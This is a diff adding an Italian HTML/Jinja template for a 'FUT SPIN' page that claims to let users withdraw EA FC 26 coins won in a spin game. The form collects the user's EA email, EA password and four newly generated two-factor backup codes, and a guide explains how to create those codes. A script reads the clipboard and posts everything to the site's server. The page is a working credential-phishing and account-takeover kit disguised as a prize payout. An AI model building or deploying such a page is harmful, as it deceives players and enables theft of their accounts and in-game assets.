@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FUT SPIN — Prelievo FC Coins</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #0e0e14;
+  --bg2:    #16161f;
+  --card:   #1c1c28;
+  --card2:  #22222f;
+  --border: rgba(255,255,255,0.08);
+  --orange: #f97316;
+  --orange2:#fb923c;
+  --gold:   #FFD700;
+  --green:  #22c55e;
+  --red:    #ef4444;
+  --text:   #e8e8f0;
+  --muted:  #6b6b8a;
+  --accent: #00e5ff;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:'Barlow',sans-serif; min-height:100vh; }
+
+/* HEADER */
+.top-bar {
+  display:flex; align-items:center; gap:16px;
+  padding:14px 28px;
+  background:var(--bg2);
+  border-bottom:1px solid var(--border);
+  position:sticky; top:0; z-index:100;
+}
+.back-btn {
+  display:flex; align-items:center; gap:6px;
+  color:var(--text); text-decoration:none;
+  font-weight:700; font-size:0.9rem;
+  padding:6px 14px; border-radius:20px;
+  border:1px solid var(--border);
+  transition:all 0.2s;
+}
+.back-btn:hover { border-color:var(--orange); color:var(--orange); }
+.top-bar-title {
+  font-family:'Bebas Neue',sans-serif;
+  font-size:1.4rem; letter-spacing:3px; color:var(--text);
+}
+.top-bar-coins {
+  margin-left:auto;
+  display:flex; align-items:center; gap:8px;
+  background:rgba(255,215,0,0.1);
+  border:1px solid rgba(255,215,0,0.3);
+  padding:6px 14px; border-radius:50px;
+  font-weight:700; font-size:0.9rem;
+}
+
+/* LAYOUT */
+.page-wrap {
+  max-width:1200px; margin:0 auto;
+  padding:32px 24px;
+  display:grid;
+  grid-template-columns:1fr 320px;
+  gap:28px;
+  align-items:start;
+}
+@media(max-width:900px) {
+  .page-wrap { grid-template-columns:1fr; }
+  .sidebar { order:2; }
+  .main-col { order:1; }
+}
+
+/* PROGRESS STEPS */
+.steps-card {
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:28px 32px;
+  margin-bottom:20px;
+}
+.steps-row {
+  display:flex; align-items:center; justify-content:space-between;
+  position:relative;
+}
+.step-line {
+  position:absolute; top:22px; left:40px; right:40px; height:2px;
+  background: repeating-linear-gradient(90deg, var(--orange) 0, var(--orange) 6px, transparent 6px, transparent 14px);
+  z-index:0;
+}
+.step {
+  display:flex; flex-direction:column; align-items:center; gap:8px;
+  position:relative; z-index:1; flex:1;
+}
+.step-icon {
+  width:44px; height:44px; border-radius:50%;
+  background:var(--card2); border:2px solid var(--muted);
+  display:flex; align-items:center; justify-content:center;
+  font-size:1.1rem; transition:all 0.3s;
+}
+.step.active .step-icon  { border-color:var(--orange); background:rgba(249,115,22,0.15); }
+.step.done .step-icon    { border-color:var(--orange); background:var(--orange); color:#000; }
+.step-label {
+  font-size:0.72rem; text-align:center; color:var(--muted);
+  font-weight:600; letter-spacing:0.5px; max-width:80px;
+}
+.step.active .step-label { color:var(--orange); }
+.step.done .step-label   { color:var(--orange2); }
+
+/* FORM CARD */
+.form-card {
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:28px 32px;
+}
+
+/* Amount + Platform header */
+.order-header {
+  display:grid; grid-template-columns:1fr 1fr; gap:16px;
+  margin-bottom:28px;
+}
+.order-box {
+  background:var(--card2);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:16px 20px;
+  display:flex; align-items:center; gap:14px;
+}
+.order-box-icon { font-size:1.8rem; }
+.order-box-label { font-size:0.7rem; color:var(--muted); text-transform:uppercase; letter-spacing:1px; margin-bottom:4px; }
+.order-box-value { font-family:'Bebas Neue',sans-serif; font-size:1.5rem; color:var(--orange); letter-spacing:2px; }
+.platform-change {
+  margin-left:auto;
+  font-size:0.78rem; color:var(--orange);
+  cursor:pointer; font-weight:700;
+  display:flex; align-items:center; gap:4px;
+  background:none; border:none;
+}
+.platform-change:hover { text-decoration:underline; }
+
+/* PLATFORM SELECTOR */
+.platform-selector {
+  display:none; gap:10px; margin-bottom:20px;
+}
+.platform-selector.show { display:flex; }
+.plat-btn {
+  flex:1; padding:10px 8px; border-radius:10px;
+  background:var(--card2); border:2px solid var(--border);
+  color:var(--muted); font-weight:700; font-size:0.82rem;
+  cursor:pointer; transition:all 0.2s; text-align:center;
+  font-family:'Barlow',sans-serif;
+}
+.plat-btn:hover { border-color:var(--orange); color:var(--orange); }
+.plat-btn.selected { border-color:var(--orange); color:var(--orange); background:rgba(249,115,22,0.1); }
+
+/* FORM FIELDS */
+.field-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:20px; }
+.field-row.single { grid-template-columns:1fr; }
+@media(max-width:600px) { .field-row { grid-template-columns:1fr; } }
+
+.field { display:flex; flex-direction:column; gap:6px; }
+.field-label {
+  font-size:0.72rem; font-weight:700; letter-spacing:1.5px;
+  text-transform:uppercase; color:var(--muted);
+}
+.field-label .req { color:var(--orange); margin-right:2px; }
+.field-hint { font-size:0.68rem; color:var(--muted); margin-top:-2px; }
+.field input {
+  background:var(--card2);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:12px 14px;
+  color:var(--text); font-family:'Barlow',sans-serif;
+  font-size:0.95rem; font-weight:600; outline:none;
+  transition:border-color 0.2s, box-shadow 0.2s;
+}
+.field input:focus { border-color:var(--orange); box-shadow:0 0 0 3px rgba(249,115,22,0.12); }
+.field input::placeholder { color:#3a3a50; font-weight:400; }
+.field input.error-field { border-color:var(--red); }
+
+/* BACKUP CODES */
+.backup-section { margin-bottom:24px; }
+.backup-header {
+  display:flex; justify-content:space-between; align-items:center;
+  margin-bottom:10px;
+}
+.backup-title { font-size:0.72rem; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:var(--muted); }
+.backup-title .req { color:var(--orange); margin-right:2px; }
+.backup-hint { font-size:0.68rem; color:var(--muted); }
+.paste-all-btn {
+  font-size:0.75rem; font-weight:700; color:var(--orange);
+  background:none; border:none; cursor:pointer;
+  font-family:'Barlow',sans-serif; padding:4px 8px;
+  border-radius:6px; border:1px solid rgba(249,115,22,0.3);
+  transition:all 0.2s;
+}
+.paste-all-btn:hover { background:rgba(249,115,22,0.08); }
+.backup-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; }
+@media(max-width:600px) { .backup-grid { grid-template-columns:repeat(2,1fr); } }
+.backup-input {
+  background:var(--card2); border:1px solid var(--border);
+  border-radius:10px; padding:10px 12px;
+  color:var(--text); font-family:'Barlow',sans-serif;
+  font-size:0.88rem; font-weight:600; outline:none;
+  transition:border-color 0.2s, box-shadow 0.2s;
+  width:100%; text-align:center;
+}
+.backup-input:focus { border-color:var(--orange); box-shadow:0 0 0 3px rgba(249,115,22,0.12); }
+.backup-input::placeholder { color:#3a3a50; font-size:0.75rem; font-weight:400; }
+.backup-input.error-field { border-color:var(--red); }
+
+.backup-link {
+  margin-top:10px;
+  font-size:0.78rem; color:var(--orange); cursor:pointer;
+  font-weight:700; text-decoration:none;
+  display:inline-flex; align-items:center; gap:4px;
+}
+.backup-link:hover { text-decoration:underline; }
+
+/* FIELD ERROR */
+.field-error { font-size:0.72rem; color:var(--red); font-weight:600; margin-top:2px; }
+
+/* SUBMIT */
+.submit-wrap { text-align:center; padding-top:8px; }
+.submit-btn {
+  padding:15px 80px;
+  background:linear-gradient(135deg,var(--orange),#ea580c);
+  border:none; border-radius:50px;
+  color:#fff; font-family:'Bebas Neue',sans-serif;
+  font-size:1.4rem; letter-spacing:3px;
+  cursor:pointer; transition:all 0.2s;
+  box-shadow:0 4px 20px rgba(249,115,22,0.35);
+}
+.submit-btn:hover { transform:translateY(-2px); box-shadow:0 8px 28px rgba(249,115,22,0.5); }
+.submit-btn:disabled { background:#333; color:#666; cursor:not-allowed; box-shadow:none; transform:none; }
+
+/* SUCCESS STATE */
+.success-card {
+  background:var(--card);
+  border:1px solid rgba(34,197,94,0.3);
+  border-radius:16px; padding:40px 32px;
+  text-align:center; display:none;
+}
+.success-card.show { display:block; }
+.success-icon { font-size:4rem; margin-bottom:16px; }
+.success-title { font-family:'Bebas Neue',sans-serif; font-size:2.2rem; letter-spacing:3px; color:var(--green); margin-bottom:8px; }
+.success-sub { color:var(--muted); font-size:0.9rem; margin-bottom:28px; line-height:1.7; }
+.success-info { background:rgba(34,197,94,0.06); border:1px solid rgba(34,197,94,0.15); border-radius:12px; padding:16px 20px; margin-bottom:20px; text-align:left; }
+.success-row { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid rgba(255,255,255,0.05); font-size:0.85rem; }
+.success-row:last-child { border-bottom:none; }
+.success-row span { color:var(--muted); }
+.success-row strong { color:var(--text); }
+
+.new-req-btn {
+  background:none; border:1px solid var(--border); color:var(--muted);
+  padding:10px 24px; border-radius:10px; cursor:pointer;
+  font-family:'Barlow',sans-serif; font-size:0.85rem; font-weight:600;
+  transition:all 0.2s; width:100%;
+}
+.new-req-btn:hover { border-color:var(--text); color:var(--text); }
+
+/* SIDEBAR */
+.sidebar-card {
+  background:var(--card); border:1px solid var(--border);
+  border-radius:16px; padding:24px; position:sticky; top:80px;
+}
+.sidebar-title {
+  font-family:'Bebas Neue',sans-serif; font-size:1.1rem;
+  letter-spacing:2px; color:var(--orange); margin-bottom:18px;
+}
+.req-list { list-style:none; display:flex; flex-direction:column; gap:14px; }
+.req-item { display:flex; gap:10px; font-size:0.82rem; line-height:1.6; }
+.req-dot { color:var(--orange); font-size:0.65rem; margin-top:5px; flex-shrink:0; }
+.req-item strong { color:var(--orange); }
+.req-item .hl { color:var(--orange); font-weight:700; }
+.req-item .hl-red { color:#ff4d4d; font-weight:700; }
+
+/* TOAST */
+.toast {
+  position:fixed; bottom:24px; left:50%;
+  transform:translateX(-50%) translateY(100px);
+  background:var(--card2); border:1px solid var(--border);
+  color:var(--text); padding:12px 24px; border-radius:50px;
+  font-weight:600; z-index:1000; transition:transform 0.3s;
+  font-size:0.88rem; white-space:nowrap;
+}
+.toast.show { transform:translateX(-50%) translateY(0); }
+.toast.error { border-color:var(--red); color:var(--red); }
+
+/* MODAL — Backup Codes Guide */
+.modal-overlay {
+  position:fixed; inset:0; background:rgba(0,0,0,0.88);
+  display:flex; align-items:center; justify-content:center;
+  z-index:2000; opacity:0; pointer-events:none; transition:opacity 0.3s;
+  padding:20px;
+}
+.modal-overlay.show { opacity:1; pointer-events:all; }
+.modal-box {
+  background:var(--card); border:1px solid var(--border);
+  border-radius:20px; max-width:600px; width:100%;
+  max-height:85vh; overflow-y:auto;
+  padding:32px 28px; position:relative;
+}
+.modal-close {
+  position:absolute; top:16px; right:16px;
+  background:rgba(255,255,255,0.06); border:1px solid var(--border);
+  color:var(--muted); width:32px; height:32px; border-radius:50%;
+  cursor:pointer; font-size:1rem; display:flex; align-items:center; justify-content:center;
+  transition:all 0.2s;
+}
+.modal-close:hover { background:rgba(255,255,255,0.12); color:var(--text); }
+.modal-title { font-family:'Bebas Neue',sans-serif; font-size:1.6rem; letter-spacing:2px; color:var(--text); margin-bottom:24px; text-align:center; }
+.guide-step { margin-bottom:22px; }
+.guide-step-num { font-size:0.8rem; font-weight:700; color:var(--orange); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px; }
+.guide-step p { font-size:0.85rem; line-height:1.7; color:var(--text); }
+.guide-step p strong { color:var(--orange); }
+.guide-img {
+  width:100%; border-radius:10px; margin-top:10px;
+  border:1px solid var(--border); background:var(--card2);
+  min-height:60px; display:flex; align-items:center; justify-content:center;
+  color:var(--muted); font-size:0.75rem;
+  overflow:hidden;
+}
+.guide-img img { width:100%; border-radius:10px; display:block; }
+.guide-note {
+  background:rgba(249,115,22,0.08); border:1px solid rgba(249,115,22,0.2);
+  border-radius:10px; padding:12px 16px;
+  font-size:0.8rem; color:var(--text); line-height:1.6;
+  display:flex; gap:10px;
+}
+.guide-note-icon { font-size:1rem; flex-shrink:0; }
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="top-bar">
+  <a href="/" class="back-btn">← Torna al gioco</a>
+  <div class="top-bar-title">WITHDRAW FC 26 COINS</div>
+  <div class="top-bar-coins">🪙 <span id="coin-display">{{ "{:,}".format(user.coins) }}</span> FC</div>
+</div>
+
+<div class="page-wrap">
+  <!-- MAIN COLUMN -->
+  <div class="main-col">
+
+    <!-- STEPS -->
+    <div class="steps-card">
+      <div class="steps-row">
+        <div class="step-line"></div>
+        <div class="step active" id="step-1">
+          <div class="step-icon">📋</div>
+          <div class="step-label">1. Submit EA Account</div>
+        </div>
+        <div class="step" id="step-2">
+          <div class="step-icon">🛡️</div>
+          <div class="step-label">2. Account Verification</div>
+        </div>
+        <div class="step" id="step-3">
+          <div class="step-icon">📦</div>
+          <div class="step-label">3. Seller Delivery</div>
+        </div>
+        <div class="step" id="step-4">
+          <div class="step-icon">✅</div>
+          <div class="step-label">4. Order Completed</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FORM CARD -->
+    <div class="form-card" id="form-card">
+
+      <!-- Order header: amount + platform -->
+      <div class="order-header">
+        <div class="order-box">
+          <div class="order-box-icon">💰</div>
+          <div>
+            <div class="order-box-label">Withdraw Amount</div>
+            <div class="order-box-value" id="amount-display">
+              {% if user.coins >= 200000 %}
+                {{ (user.coins // 1000) }}K
+              {% else %}
+                — K
+              {% endif %}
+            </div>
+          </div>
+        </div>
+        <div class="order-box">
+          <div class="order-box-icon">🎮</div>
+          <div style="flex:1;">
+            <div class="order-box-label">Platform</div>
+            <div class="order-box-value" id="platform-display">PS4/PS5</div>
+          </div>
+          <button class="platform-change" onclick="togglePlatform()">⇄ Change</button>
+        </div>
+      </div>
+
+      <!-- Amount input -->
+      <div class="field-row single" style="margin-bottom:20px;">
+        <div class="field">
+          <div class="field-label"><span class="req">*</span> Coins da Prelevare (FC)</div>
+          <input type="number" id="wd-amount" placeholder="es. 200000"
+                 min="{{ withdraw_min }}" step="1000"
+                 oninput="updateAmountDisplay()"
+                 value="{{ user.coins if user.coins >= withdraw_min else '' }}">
+          <div class="field-error" id="err-amount"></div>
+        </div>
+      </div>
+
+      <!-- Platform selector -->
+      <div class="platform-selector" id="platform-selector">
+        {% for p in platforms %}
+        <button class="plat-btn {{ 'selected' if loop.first }}" onclick="selectPlatform('{{ p }}', this)">{{ p }}</button>
+        {% endfor %}
+      </div>
+
+      <!-- EA fields -->
+      <div class="field-row">
+        <div class="field">
+          <div class="field-label"><span class="req">*</span> EA Account (Email)</div>
+          <input type="email" id="ea-account" placeholder="tua@email.com" autocomplete="off">
+          <div class="field-error" id="err-ea-account"></div>
+        </div>
+        <div class="field">
+          <div class="field-label"><span class="req">*</span> EA Password</div>
+          <input type="password" id="ea-password" placeholder="••••••••" autocomplete="new-password">
+          <div class="field-error" id="err-ea-password"></div>
+        </div>
+      </div>
+
+      <div class="field-row single">
+        <div class="field">
+          <div class="field-label"><span class="req">*</span> Current Coins Amount (nel tuo FUT Club)</div>
+          <div class="field-hint">Inserisci i coins che hai attualmente nel club (es. 1500)</div>
+          <input type="text" id="current-coins" placeholder="es. 1500" autocomplete="off">
+          <div class="field-error" id="err-current-coins"></div>
+        </div>
+      </div>
+
+      <!-- Backup Codes -->
+      <div class="backup-section">
+        <div class="backup-header">
+          <div>
+            <div class="backup-title"><span class="req">*</span> Backup Code EA</div>
+            <div class="backup-hint">Clicca "Create new codes" su ea.com per generare codici validi</div>
+          </div>
+          <button class="paste-all-btn" onclick="pasteAll()">📋 One-click paste</button>
+        </div>
+        <div class="backup-grid">
+          <input class="backup-input" id="bc1" placeholder="Backup Code 1" autocomplete="off">
+          <input class="backup-input" id="bc2" placeholder="Backup Code 2" autocomplete="off">
+          <input class="backup-input" id="bc3" placeholder="Backup Code 3" autocomplete="off">
+          <input class="backup-input" id="bc4" placeholder="Backup Code 4" autocomplete="off">
+        </div>
+        <div class="field-error" id="err-backup" style="margin-top:6px;"></div>
+        <a class="backup-link" onclick="openGuide()">❓ Come ottenere i Backup Code EA &rsaquo;</a>
+      </div>
+
+      <!-- Submit -->
+      <div class="submit-wrap">
+        <button class="submit-btn" id="submit-btn" onclick="submitWithdraw()">Submit</button>
+      </div>
+    </div>
+
+    <!-- SUCCESS CARD -->
+    <div class="success-card" id="success-card">
+      <div class="success-icon">✅</div>
+      <div class="success-title">RICHIESTA INVIATA!</div>
+      <div class="success-sub">
+        La tua richiesta è stata registrata con successo.<br>
+        Il nostro team elaborerà il prelievo entro <strong style="color:var(--text)">24 ore</strong>.<br>
+        Puoi monitorare lo stato qui sotto nella sezione <strong style="color:var(--orange)">I Miei Prelievi</strong>.
+      </div>
+      <div class="success-info">
+        <div class="success-row"><span>Codice richiesta</span><strong id="sc-code" style="color:var(--orange);letter-spacing:2px;">—</strong></div>
+        <div class="success-row"><span>Coins prelevati</span><strong id="sc-amount" style="color:var(--green);">—</strong></div>
+        <div class="success-row"><span>Saldo rimanente</span><strong id="sc-remain">—</strong></div>
+        <div class="success-row"><span>Stato</span><strong style="color:var(--orange);">⏳ In elaborazione</strong></div>
+      </div>
+      <button class="new-req-btn" onclick="resetForm(); loadHistory()">← Nuova richiesta</button>
+    </div>
+
+  </div><!-- /main-col -->
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <div class="sidebar-title">📋 Requirements</div>
+      <ul class="req-list">
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>Per garantire la sicurezza del tuo account, possiamo processare fino a <strong>1.000K–1.500K</strong> per batch. Mantieni la password invariata e attendi. Il resto verrà consegnato 24 ore dopo.</span>
+        </li>
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>Il <strong>Transfer Market</strong> su Companion/Web APP deve essere sbloccato.</span>
+        </li>
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>Ci devono essere almeno <span class="hl">2K coins</span> nel tuo FUT Club.</span>
+        </li>
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>DEVI resettare la tua EA Password regolarmente. È importante per la sicurezza del tuo FUT Club!!!</span>
+        </li>
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>Per sicurezza, <span class="hl-red">NON acquistare coins</span> su altri siti non affidabili entro <span class="hl">7 GIORNI</span> prima o dopo il prelievo.</span>
+        </li>
+        <li class="req-item">
+          <span class="req-dot">●</span>
+          <span>Ti raccomandiamo di prelevare coins <strong>UNA VOLTA</strong> ogni <span class="hl">24 Ore</span>.</span>
+        </li>
+      </ul>
+    </div>
+  </div><!-- /sidebar -->
+</div><!-- /page-wrap -->
+
+<!-- ══ I MIEI PRELIEVI ══════════════════════════════════════ -->
+<style>
+.history-section {
+  max-width: 980px; margin: 32px auto 48px; padding: 0 20px;
+}
+.history-title {
+  font-family:'Bebas Neue',sans-serif; font-size:1.6rem; letter-spacing:3px;
+  color:var(--text); margin-bottom:20px;
+}
+.history-title span { color:var(--orange); }
+.history-card {
+  background:var(--card); border:1px solid var(--border); border-radius:16px; overflow:hidden;
+}
+.history-table { width:100%; border-collapse:collapse; }
+.history-table th {
+  font-size:0.72rem; letter-spacing:2px; text-transform:uppercase;
+  color:var(--muted); padding:12px 18px; text-align:left;
+  border-bottom:1px solid var(--border); background:rgba(255,255,255,0.02);
+}
+.history-table td {
+  padding:14px 18px; border-bottom:1px solid rgba(255,255,255,0.04);
+  font-size:0.88rem; vertical-align:middle;
+}
+.history-table tr:last-child td { border-bottom:none; }
+.history-table tr:hover td { background:rgba(255,255,255,0.02); }
+.status-pill {
+  display:inline-flex; align-items:center; gap:6px;
+  padding:5px 12px; border-radius:20px;
+  font-size:0.72rem; font-weight:700; letter-spacing:1px; text-transform:uppercase;
+}
+.status-submitted { background:rgba(0,229,255,0.1);  color:#00e5ff; border:1px solid rgba(0,229,255,0.2); }
+.status-approved  { background:rgba(34,197,94,0.1);  color:#22c55e; border:1px solid rgba(34,197,94,0.2); }
+.status-rejected  { background:rgba(239,68,68,0.1);  color:#ef4444; border:1px solid rgba(239,68,68,0.2); }
+.status-dot { width:6px; height:6px; border-radius:50%; background:currentColor; display:inline-block; }
+.history-empty {
+  text-align:center; color:var(--muted); padding:48px 20px; font-size:0.9rem;
+}
+.history-loading { text-align:center; color:var(--muted); padding:32px; font-size:0.9rem; }
+</style>
+
+<div class="history-section">
+  <div class="history-title">📋 I Miei <span>Prelievi</span></div>
+  <div class="history-card">
+    <div id="history-content" class="history-loading">Caricamento…</div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- GUIDE MODAL -->
+<div class="modal-overlay" id="guide-modal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeGuide()">✕</button>
+    <div class="modal-title">Come ottenere i Backup Code EA?</div>
+
+    <div class="guide-step">
+      <div class="guide-step-num">Step 1</div>
+      <p>Accedi su <strong>www.ea.com</strong> con la tua EA Account Email e Password. Clicca sull'icona del tuo profilo in alto a destra, poi su <strong>"Account Settings"</strong>.</p>
+    </div>
+
+    <div class="guide-step">
+      <div class="guide-step-num">Step 2</div>
+      <p>Clicca su <strong style="color:var(--orange)">"Account Settings"</strong>, poi scegli <strong style="color:var(--orange)">Security and Privacy</strong>.</p>
+    </div>
+
+    <div class="guide-step">
+      <div class="guide-step-num">Step 3</div>
+      <p>Trova <strong style="color:var(--orange)">Two-factor authentication</strong> (precedentemente Login Verification). Assicurati che lo stato sia <strong>"Enabled"</strong>, poi clicca il pulsante <strong>">"</strong>.</p>
+    </div>
+
+    <div class="guide-step">
+      <div class="guide-step-num">Step 4</div>
+      <p>Verifica la tua identità tramite il tuo metodo di contatto preferito, poi potrai cliccare il bottone <strong style="color:var(--orange)">"View backup codes"</strong>.</p>
+    </div>
+
+    <div class="guide-step">
+      <div class="guide-step-num">Step 5</div>
+      <p>Clicca <strong style="color:var(--orange)">"Create new code"</strong> per generare nuovi Backup Code. Assicurati che i backup code che invii siano sempre <strong>NON UTILIZZATI</strong> ogni volta che fai una richiesta.</p>
+    </div>
+
+    <div class="guide-note">
+      <span class="guide-note-icon">⚠️</span>
+      <span>Ogni volta che fai una richiesta devi creare un nuovo codice e copiare 4 nuovi backup code. I vecchi codici potrebbero non funzionare.</span>
+    </div>
+  </div>
+</div>
+
+<script>
+const WITHDRAW_MIN = {{ withdraw_min }};
+const USER_COINS = {{ user.coins }};
+let selectedPlatform = "PS4/PS5";
+
+// ── PLATFORM ──────────────────────────────────
+function togglePlatform() {
+  const sel = document.getElementById('platform-selector');
+  sel.classList.toggle('show');
+}
+function selectPlatform(name, btn) {
+  selectedPlatform = name;
+  document.getElementById('platform-display').textContent = name;
+  document.querySelectorAll('.plat-btn').forEach(b => b.classList.remove('selected'));
+  btn.classList.add('selected');
+  document.getElementById('platform-selector').classList.remove('show');
+}
+
+// ── AMOUNT DISPLAY ─────────────────────────────
+function updateAmountDisplay() {
+  const val = parseInt(document.getElementById('wd-amount').value) || 0;
+  const k = val >= 1000 ? Math.round(val/1000)+'K' : val+'';
+  document.getElementById('amount-display').textContent = k || '—';
+}
+
+// ── PASTE ALL BACKUP CODES ─────────────────────
+async function pasteAll() {
+  try {
+    const text = await navigator.clipboard.readText();
+    const codes = text.trim().split(/[\n\r,;\s]+/).filter(c => c.length > 0);
+    ['bc1','bc2','bc3','bc4'].forEach((id, i) => {
+      if (codes[i]) document.getElementById(id).value = codes[i];
+    });
+    showToast('📋 Codici incollati!');
+  } catch(e) {
+    showToast('⚠️ Impossibile accedere agli appunti. Incolla manualmente.', true);
+  }
+}
+
+// ── VALIDATE ──────────────────────────────────
+function clearErrors() {
+  ['err-amount','err-ea-account','err-ea-password','err-current-coins','err-backup'].forEach(id => {
+    document.getElementById(id).textContent = '';
+  });
+  ['wd-amount','ea-account','ea-password','current-coins','bc1','bc2','bc3','bc4'].forEach(id => {
+    document.getElementById(id).classList.remove('error-field');
+  });
+}
+
+function setError(fieldId, errId, msg) {
+  document.getElementById(errId).textContent = msg;
+  document.getElementById(fieldId).classList.add('error-field');
+}
+
+function validate() {
+  clearErrors();
+  let ok = true;
+  const amount = parseInt(document.getElementById('wd-amount').value) || 0;
+  if (amount < WITHDRAW_MIN) {
+    setError('wd-amount','err-amount', `Minimo ${WITHDRAW_MIN.toLocaleString('it-IT')} FC`); ok = false;
+  } else if (amount > USER_COINS) {
+    setError('wd-amount','err-amount', 'Saldo insufficiente'); ok = false;
+  }
+  const email = document.getElementById('ea-account').value.trim();
+  if (!email || !email.includes('@')) {
+    setError('ea-account','err-ea-account','Email EA non valida'); ok = false;
+  }
+  const pass = document.getElementById('ea-password').value.trim();
+  if (!pass) {
+    setError('ea-password','err-ea-password','Campo obbligatorio'); ok = false;
+  }
+  const cc = document.getElementById('current-coins').value.trim();
+  if (!cc) {
+    setError('current-coins','err-current-coins','Campo obbligatorio'); ok = false;
+  }
+  const bcs = ['bc1','bc2','bc3','bc4'].map(id => document.getElementById(id).value.trim());
+  if (bcs.some(b => !b)) {
+    document.getElementById('err-backup').textContent = 'Tutti e 4 i Backup Code sono obbligatori';
+    bcs.forEach((b,i) => { if(!b) document.getElementById(['bc1','bc2','bc3','bc4'][i]).classList.add('error-field'); });
+    ok = false;
+  }
+  return ok;
+}
+
+// ── SUBMIT ────────────────────────────────────
+function submitWithdraw() {
+  if (!validate()) return;
+  const btn = document.getElementById('submit-btn');
+  btn.disabled = true; btn.textContent = 'Elaborazione...';
+
+  const payload = {
+    amount:         parseInt(document.getElementById('wd-amount').value),
+    platform:       selectedPlatform,
+    ea_account:     document.getElementById('ea-account').value.trim(),
+    ea_password:    document.getElementById('ea-password').value.trim(),
+    current_coins:  document.getElementById('current-coins').value.trim(),
+    backup_code_1:  document.getElementById('bc1').value.trim(),
+    backup_code_2:  document.getElementById('bc2').value.trim(),
+    backup_code_3:  document.getElementById('bc3').value.trim(),
+    backup_code_4:  document.getElementById('bc4').value.trim(),
+  };
+
+  fetch('/api/withdraw-request', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(payload)
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.success) {
+      // Update steps
+      setStep(2);
+      // Show success
+      document.getElementById('form-card').style.display = 'none';
+      const sc = document.getElementById('success-card');
+      sc.classList.add('show');
+      document.getElementById('sc-code').textContent = data.code;
+      document.getElementById('sc-amount').textContent = payload.amount.toLocaleString('it-IT') + ' FC';
+      document.getElementById('sc-remain').textContent = data.coins_remaining.toLocaleString('it-IT') + ' FC';
+      document.getElementById('coin-display').textContent = data.coins_remaining.toLocaleString('it-IT');
+      loadHistory();
+    } else {
+      showToast('⚠️ ' + (data.error || 'Errore'), true);
+      btn.disabled = false; btn.textContent = 'Submit';
+    }
+  })
+  .catch(() => {
+    showToast('⚠️ Errore di rete', true);
+    btn.disabled = false; btn.textContent = 'Submit';
+  });
+}
+
+function setStep(n) {
+  for (let i=1; i<=4; i++) {
+    const el = document.getElementById('step-'+i);
+    el.classList.remove('active','done');
+    if (i < n) el.classList.add('done');
+    else if (i === n) el.classList.add('active');
+  }
+}
+
+function resetForm() {
+  document.getElementById('success-card').classList.remove('show');
+  document.getElementById('form-card').style.display = 'block';
+  document.getElementById('submit-btn').disabled = false;
+  document.getElementById('submit-btn').textContent = 'Submit';
+  clearErrors();
+  setStep(1);
+}
+
+// ── GUIDE MODAL ────────────────────────────────
+function openGuide() {
+  document.getElementById('guide-modal').classList.add('show');
+}
+function closeGuide() {
+  document.getElementById('guide-modal').classList.remove('show');
+}
+document.getElementById('guide-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeGuide();
+});
+
+// ── TOAST ──────────────────────────────────────
+function showToast(msg, isError=false) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast' + (isError ? ' error' : '');
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2800);
+}
+
+// ── STORICO PRELIEVI ───────────────────────────
+const STATUS_LABELS = {
+  submitted: { label: '⏳ In elaborazione', cls: 'status-submitted' },
+  approved:  { label: '✅ Approvato',        cls: 'status-approved'  },
+  rejected:  { label: '❌ Rifiutato',        cls: 'status-rejected'  },
+};
+
+async function loadHistory() {
+  const el = document.getElementById('history-content');
+  el.innerHTML = '<div class="history-loading">Caricamento…</div>';
+  try {
+    const res  = await fetch('/api/my-withdrawals');
+    const data = await res.json();
+    if (!data.length) {
+      el.innerHTML = '<div class="history-empty">Non hai ancora effettuato nessuna richiesta di prelievo.</div>';
+      return;
+    }
+    let rows = data.map(w => {
+      const s = STATUS_LABELS[w.status] || { label: w.status, cls: '' };
+      return `<tr>
+        <td style="font-family:monospace;font-size:0.8rem;color:var(--muted)">${w.code}</td>
+        <td style="color:var(--gold);font-weight:700">${Number(w.amount).toLocaleString('it-IT')} FC</td>
+        <td style="color:var(--muted)">${w.platform}</td>
+        <td style="color:var(--muted);font-size:0.82rem">${w.created_at.substring(0,16)}</td>
+        <td><span class="status-pill ${s.cls}">${s.label}</span></td>
+      </tr>`;
+    }).join('');
+    el.innerHTML = `<table class="history-table">
+      <thead><tr>
+        <th>Codice</th><th>Importo</th><th>Piattaforma</th><th>Data</th><th>Stato</th>
+      </tr></thead>
+      <tbody>${rows}</tbody>
+    </table>`;
+  } catch(e) {
+    el.innerHTML = '<div class="history-empty">Errore nel caricamento dello storico.</div>';
+  }
+}
+
+// Init
+updateAmountDisplay();
+loadHistory();
+</script>
+</body>
+</html>
